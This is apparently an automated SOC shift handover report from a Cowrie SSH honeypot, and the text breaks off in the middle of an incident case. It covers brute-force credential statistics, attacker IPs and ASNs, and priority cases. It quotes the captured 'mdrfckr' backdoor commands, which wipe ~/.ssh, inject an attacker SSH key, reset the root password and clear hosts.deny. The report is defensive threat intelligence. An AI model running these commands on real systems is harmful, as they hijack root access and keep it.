# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-13 |
| **Generated At** | 2026-06-13T23:10:14Z |
| **Shift Time** | 23:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **322** |
| Confirmed Threats | **293** |
| False Positives Filtered | **29** (9.0%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **15** |
| High Severity Cases | **76** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **246** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **187** |
| Unique Credential Pairs | **107** |
| Unique Usernames | **62** |
| Unique Passwords | **87** |
| Successful Auth Pairs | **48** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `345gs5662d34` | 38 |
| `ubuntu` | 3 |
| `icdenetim` | 2 |
| `hj` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 38 |
| `3245gs5662d34` | 37 |
| `123456` | 13 |
| `123` | 6 |
| `password` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 38 |
| `root` | `3245gs5662d34` | 37 |
| `icdenetim` | `icdenetim123` | 2 |
| `hj` | `123456` | 2 |
| `ssotest` | `ssotest` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin@12345678` | `213.136.88.112` | 2026-06-13T21:20:58 |
| `root` | `3245gs5662d34` | `213.136.88.112` | 2026-06-13T21:21:03 |
| `root` | `Adm@2026` | `213.136.88.112` | 2026-06-13T21:23:13 |
| `root` | `Abcd8888` | `213.136.88.112` | 2026-06-13T21:25:24 |
| `root` | `12332112` | `43.164.192.38` | 2026-06-13T21:45:46 |
| `root` | `3245gs5662d34` | `43.164.192.38` | 2026-06-13T21:45:54 |
| `root` | `Password88` | `159.223.213.49` | 2026-06-13T21:46:48 |
| `root` | `3245gs5662d34` | `159.223.213.49` | 2026-06-13T21:46:52 |
| `root` | `kid` | `43.164.192.38` | 2026-06-13T21:48:00 |
| `root` | `Admin123*` | `159.223.213.49` | 2026-06-13T21:50:02 |
| `root` | `Qwer.123456` | `159.223.213.49` | 2026-06-13T21:54:31 |
| `root` | `zz@123456` | `62.238.22.252` | 2026-06-13T21:56:52 |
| `root` | `3245gs5662d34` | `62.238.22.252` | 2026-06-13T21:56:55 |
| `root` | `admin@520` | `159.223.213.49` | 2026-06-13T22:00:48 |
| `root` | `ali` | `43.164.192.38` | 2026-06-13T22:03:02 |
| `root` | `Pp123456!` | `43.164.192.38` | 2026-06-13T22:05:12 |
| `root` | `Digital@2021` | `159.223.213.49` | 2026-06-13T22:05:32 |
| `root` | `Ahgf3487@rtjhskl854hd47893@#a4nC` | `159.223.213.49` | 2026-06-13T22:07:11 |
| `root` | `qqQQ123123` | `43.164.192.38` | 2026-06-13T22:07:26 |
| `root` | `letmein123` | `103.75.183.177` | 2026-06-13T22:08:24 |
| `root` | `3245gs5662d34` | `103.75.183.177` | 2026-06-13T22:08:26 |
| `root` | `123456b` | `103.75.183.177` | 2026-06-13T22:10:25 |
| `root` | `Zd123456` | `159.223.213.49` | 2026-06-13T22:10:26 |
| `root` | `Cisco@123` | `43.164.192.38` | 2026-06-13T22:12:46 |
| `root` | `asd` | `103.75.183.177` | 2026-06-13T22:16:23 |
| `root` | `admin@2024` | `159.223.213.49` | 2026-06-13T22:17:00 |
| `root` | `testtest` | `103.75.183.177` | 2026-06-13T22:18:17 |
| `root` | `password@2026` | `159.223.213.49` | 2026-06-13T22:18:44 |
| `root` | `sispac` | `159.223.213.49` | 2026-06-13T22:22:09 |
| `root` | `admin.123456` | `159.223.213.49` | 2026-06-13T22:23:53 |
| `root` | `zxcvbnm,./` | `43.164.192.38` | 2026-06-13T22:24:48 |
| `root` | `qwe123...` | `103.75.183.177` | 2026-06-13T22:24:54 |
| `root` | `Qazxsw12` | `43.164.192.38` | 2026-06-13T22:29:44 |
| `root` | `4fv5gb6hn` | `103.75.183.177` | 2026-06-13T22:29:49 |
| `root` | `3edc$RFV` | `107.189.27.179` | 2026-06-13T22:30:29 |
| `root` | `3245gs5662d34` | `107.189.27.179` | 2026-06-13T22:30:34 |
| `root` | `!234Qwer` | `103.75.183.177` | 2026-06-13T22:31:44 |
| `root` | `zaq1@WSX` | `43.164.192.38` | 2026-06-13T22:34:50 |
| `root` | `asdasxcq23e@#5C27893e` | `43.164.192.38` | 2026-06-13T22:47:32 |
| `root` | `root@Admin` | `43.164.192.38` | 2026-06-13T22:50:05 |
| `root` | `super` | `43.164.192.38` | 2026-06-13T22:52:43 |
| `root` | `1qaz9ol.` | `45.140.193.156` | 2026-06-13T22:58:14 |
| `root` | `3245gs5662d34` | `45.140.193.156` | 2026-06-13T22:58:25 |
| `root` | `Ctyun@2025` | `59.152.168.184` | 2026-06-13T22:58:37 |
| `root` | `3245gs5662d34` | `59.152.168.184` | 2026-06-13T22:58:41 |
| `root` | `felix123` | `152.52.15.213` | 2026-06-13T23:03:47 |
| `root` | `3245gs5662d34` | `152.52.15.213` | 2026-06-13T23:03:49 |
| `root` | `password!!` | `152.52.15.213` | 2026-06-13T23:05:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **322** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 193 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 189 | 18 |
| `03a80b21afa8...` | Modern SSH client | 4 | 4 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 189 | 18 | Mirai/variant |
| `03a80b21afa8...` | libssh | 4 | 4 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 37 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:vaoDK0Or43dL"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `213.136.88.112`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.75.183.177`, `62.238.22.252`, `213.136.88.112`, `43.164.192.38`, `107.189.27.179`, `59.152.168.184`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **26** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS24940` | Hetzner Online GmbH | 2 | HIGH |
| `AS51167` | Contabo GmbH | 2 | HIGH |
| `AS134420` | Chongqing Telecom | 1 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (76)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-23c3b637c605

| Field | Detail |
|---|---|
| **Source IP** | `213.136.88[.]112` |
| **First Seen** | 2026-06-13 21:20 |
| **Last Seen** | 2026-06-13 21:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:20:58` | `cowrie.session.connect` |
| `2026-06-13 21:20:58` | `cowrie.client.version` |
| `2026-06-13 21:20:58` | `cowrie.client.kex` |
| `2026-06-13 21:20:58` | `cowrie.login.success` |
| `2026-06-13 21:20:59` | `cowrie.session.params` |
| `2026-06-13 21:20:59` | `cowrie.command.input` |
| `2026-06-13 21:20:59` | `cowrie.command.failed` |
| `2026-06-13 21:20:59` | `cowrie.log.closed` |
| `2026-06-13 21:20:59` | `cowrie.session.params` |
| `2026-06-13 21:20:59` | `cowrie.command.input` |
| `2026-06-13 21:20:59` | `cowrie.session.file_download` |
| `2026-06-13 21:20:59` | `cowrie.log.closed` |
| `2026-06-13 21:21:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.136.88[.]112` to AbuseIPDB if not already reported
- [ ] Block `213.136.88[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f34a18fbbe

| Field | Detail |
|---|---|
| **Source IP** | `213.136.88[.]112` |
| **First Seen** | 2026-06-13 21:21 |
| **Last Seen** | 2026-06-13 21:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:21:03` | `cowrie.session.connect` |
| `2026-06-13 21:21:03` | `cowrie.client.version` |
| `2026-06-13 21:21:03` | `cowrie.client.kex` |
| `2026-06-13 21:21:03` | `cowrie.login.success` |
| `2026-06-13 21:21:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.136.88[.]112` to AbuseIPDB if not already reported
- [ ] Block `213.136.88[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d30bed04f183

| Field | Detail |
|---|---|
| **Source IP** | `213.136.88[.]112` |
| **First Seen** | 2026-06-13 21:23 |
| **Last Seen** | 2026-06-13 21:23 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:vaoDK0Or43dL"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:23:12` | `cowrie.session.connect` |
| `2026-06-13 21:23:12` | `cowrie.client.version` |
| `2026-06-13 21:23:12` | `cowrie.client.kex` |
| `2026-06-13 21:23:13` | `cowrie.login.success` |
| `2026-06-13 21:23:13` | `cowrie.session.params` |
| `2026-06-13 21:23:13` | `cowrie.command.input` |
| `2026-06-13 21:23:13` | `cowrie.command.failed` |
| `2026-06-13 21:23:13` | `cowrie.log.closed` |
| `2026-06-13 21:23:13` | `cowrie.session.params` |
| `2026-06-13 21:23:13` | `cowrie.command.input` |
| `2026-06-13 21:23:14` | `cowrie.session.file_download` |
| `2026-06-13 21:23:14` | `cowrie.log.closed` |
| `2026-06-13 21:23:24` | `cowrie.session.params` |
| `2026-06-13 21:23:24` | `cowrie.command.input` |
| `2026-06-13 21:23:24` | `cowrie.log.closed` |
| `2026-06-13 21:23:24` | `cowrie.session.params` |
| `2026-06-13 21:23:24` | `cowrie.command.input` |
| `2026-06-13 21:23:25` | `cowrie.log.closed` |
| `2026-06-13 21:23:25` | `cowrie.session.params` |
| `2026-06-13 21:23:25` | `cowrie.command.input` |
| `2026-06-13 21:23:25` | `cowrie.session.file_download` |
| `2026-06-13 21:23:25` | `cowrie.log.closed` |
| `2026-06-13 21:23:25` | `cowrie.session.params` |
| `2026-06-13 21:23:25` | `cowrie.command.input` |
| `2026-06-13 21:23:26` | `cowrie.log.closed` |
| `2026-06-13 21:23:26` | `cowrie.session.params` |
| `2026-06-13 21:23:26` | `cowrie.command.input` |
| `2026-06-13 21:23:26` | `cowrie.log.closed` |
| `2026-06-13 21:23:26` | `cowrie.session.params` |
| `2026-06-13 21:23:26` | `cowrie.command.input` |
| `2026-06-13 21:23:26` | `cowrie.command.input` |
| `2026-06-13 21:23:27` | `cowrie.log.closed` |
| `2026-06-13 21:23:27` | `cowrie.session.params` |
| `2026-06-13 21:23:27` | `cowrie.command.input` |
| `2026-06-13 21:23:27` | `cowrie.log.closed` |
| `2026-06-13 21:23:27` | `cowrie.session.params` |
| `2026-06-13 21:23:27` | `cowrie.command.input` |
| `2026-06-13 21:23:27` | `cowrie.log.closed` |
| `2026-06-13 21:23:28` | `cowrie.session.params` |
| `2026-06-13 21:23:28` | `cowrie.command.input` |
| `2026-06-13 21:23:28` | `cowrie.log.closed` |
| `2026-06-13 21:23:28` | `cowrie.session.params` |
| `2026-06-13 21:23:28` | `cowrie.command.input` |
| `2026-06-13 21:23:28` | `cowrie.log.closed` |
| `2026-06-13 21:23:29` | `cowrie.session.params` |
| `2026-06-13 21:23:29` | `cowrie.command.input` |
| `2026-06-13 21:23:29` | `cowrie.log.closed` |
| `2026-06-13 21:23:29` | `cowrie.session.params` |
| `2026-06-13 21:23:29` | `cowrie.command.input` |
| `2026-06-13 21:23:29` | `cowrie.log.closed` |
| `2026-06-13 21:23:30` | `cowrie.session.params` |
| `2026-06-13 21:23:30` | `cowrie.command.input` |
| `2026-06-13 21:23:30` | `cowrie.log.closed` |
| `2026-06-13 21:23:30` | `cowrie.session.params` |
| `2026-06-13 21:23:30` | `cowrie.command.input` |
| `2026-06-13 21:23:30` | `cowrie.log.closed` |
| `2026-06-13 21:23:31` | `cowrie.session.params` |
| `2026-06-13 21:23:31` | `cowrie.command.input` |
| `2026-06-13 21:23:31` | `cowrie.log.closed` |
| `2026-06-13 21:23:31` | `cowrie.session.params` |
| `2026-06-13 21:23:31` | `cowrie.command.input` |
| `2026-06-13 21:23:31` | `cowrie.log.closed` |
| `2026-06-13 21:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.136.88[.]112` to AbuseIPDB if not already reported
- [ ] Block `213.136.88[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-516ad38ba8ea

| Field | Detail |
|---|---|
| **Source IP** | `213.136.88[.]112` |
| **First Seen** | 2026-06-13 21:25 |
| **Last Seen** | 2026-06-13 21:25 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0fbIfXXzfoxM"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:25:23` | `cowrie.session.connect` |
| `2026-06-13 21:25:23` | `cowrie.client.version` |
| `2026-06-13 21:25:23` | `cowrie.client.kex` |
| `2026-06-13 21:25:24` | `cowrie.login.success` |
| `2026-06-13 21:25:24` | `cowrie.session.params` |
| `2026-06-13 21:25:24` | `cowrie.command.input` |
| `2026-06-13 21:25:24` | `cowrie.command.failed` |
| `2026-06-13 21:25:25` | `cowrie.log.closed` |
| `2026-06-13 21:25:25` | `cowrie.session.params` |
| `2026-06-13 21:25:25` | `cowrie.command.input` |
| `2026-06-13 21:25:25` | `cowrie.session.file_download` |
| `2026-06-13 21:25:25` | `cowrie.log.closed` |
| `2026-06-13 21:25:41` | `cowrie.session.params` |
| `2026-06-13 21:25:41` | `cowrie.command.input` |
| `2026-06-13 21:25:41` | `cowrie.log.closed` |
| `2026-06-13 21:25:41` | `cowrie.session.params` |
| `2026-06-13 21:25:41` | `cowrie.command.input` |
| `2026-06-13 21:25:42` | `cowrie.log.closed` |
| `2026-06-13 21:25:42` | `cowrie.session.params` |
| `2026-06-13 21:25:42` | `cowrie.command.input` |
| `2026-06-13 21:25:42` | `cowrie.session.file_download` |
| `2026-06-13 21:25:42` | `cowrie.log.closed` |
| `2026-06-13 21:25:42` | `cowrie.session.params` |
| `2026-06-13 21:25:42` | `cowrie.command.input` |
| `2026-06-13 21:25:43` | `cowrie.log.closed` |
| `2026-06-13 21:25:43` | `cowrie.session.params` |
| `2026-06-13 21:25:43` | `cowrie.command.input` |
| `2026-06-13 21:25:43` | `cowrie.log.closed` |
| `2026-06-13 21:25:43` | `cowrie.session.params` |
| `2026-06-13 21:25:43` | `cowrie.command.input` |
| `2026-06-13 21:25:43` | `cowrie.command.input` |
| `2026-06-13 21:25:44` | `cowrie.log.closed` |
| `2026-06-13 21:25:44` | `cowrie.session.params` |
| `2026-06-13 21:25:44` | `cowrie.command.input` |
| `2026-06-13 21:25:44` | `cowrie.log.closed` |
| `2026-06-13 21:25:44` | `cowrie.session.params` |
| `2026-06-13 21:25:44` | `cowrie.command.input` |
| `2026-06-13 21:25:45` | `cowrie.log.closed` |
| `2026-06-13 21:25:45` | `cowrie.session.params` |
| `2026-06-13 21:25:45` | `cowrie.command.input` |
| `2026-06-13 21:25:45` | `cowrie.log.closed` |
| `2026-06-13 21:25:45` | `cowrie.session.params` |
| `2026-06-13 21:25:45` | `cowrie.command.input` |
| `2026-06-13 21:25:46` | `cowrie.log.closed` |
| `2026-06-13 21:25:46` | `cowrie.session.params` |
| `2026-06-13 21:25:46` | `cowrie.command.input` |
| `2026-06-13 21:25:46` | `cowrie.log.closed` |
| `2026-06-13 21:25:46` | `cowrie.session.params` |
| `2026-06-13 21:25:46` | `cowrie.command.input` |
| `2026-06-13 21:25:47` | `cowrie.log.closed` |
| `2026-06-13 21:25:47` | `cowrie.session.params` |
| `2026-06-13 21:25:47` | `cowrie.command.input` |
| `2026-06-13 21:25:47` | `cowrie.log.closed` |
| `2026-06-13 21:25:47` | `cowrie.session.params` |
| `2026-06-13 21:25:47` | `cowrie.command.input` |
| `2026-06-13 21:25:48` | `cowrie.log.closed` |
| `2026-06-13 21:25:48` | `cowrie.session.params` |
| `2026-06-13 21:25:48` | `cowrie.command.input` |
| `2026-06-13 21:25:48` | `cowrie.log.closed` |
| `2026-06-13 21:25:48` | `cowrie.session.params` |
| `2026-06-13 21:25:48` | `cowrie.command.input` |
| `2026-06-13 21:25:48` | `cowrie.log.closed` |
| `2026-06-13 21:25:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.136.88[.]112` to AbuseIPDB if not already reported
- [ ] Block `213.136.88[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6420729810

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 21:45 |
| **Last Seen** | 2026-06-13 21:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:45:44` | `cowrie.session.connect` |
| `2026-06-13 21:45:44` | `cowrie.client.version` |
| `2026-06-13 21:45:44` | `cowrie.client.kex` |
| `2026-06-13 21:45:46` | `cowrie.login.success` |
| `2026-06-13 21:45:46` | `cowrie.session.params` |
| `2026-06-13 21:45:46` | `cowrie.command.input` |
| `2026-06-13 21:45:46` | `cowrie.command.failed` |
| `2026-06-13 21:45:47` | `cowrie.log.closed` |
| `2026-06-13 21:45:48` | `cowrie.session.params` |
| `2026-06-13 21:45:48` | `cowrie.command.input` |
| `2026-06-13 21:45:48` | `cowrie.session.file_download` |
| `2026-06-13 21:45:48` | `cowrie.log.closed` |
| `2026-06-13 21:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32ff0fc902f3

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 21:45 |
| **Last Seen** | 2026-06-13 21:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 21:45:52` | `cowrie.session.connect` |
| `2026-06-13 21:45:52` | `cowrie.client.version` |
| `2026-06-13 21:45:52` | `cowrie.client.kex` |
| `2026-06-13 21:45:54` | `cowrie.login.success` |
| `2026-06-13 21:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c2037c6aaf3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 21:46 |
| **Last Seen** | 2026-06-13 21:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
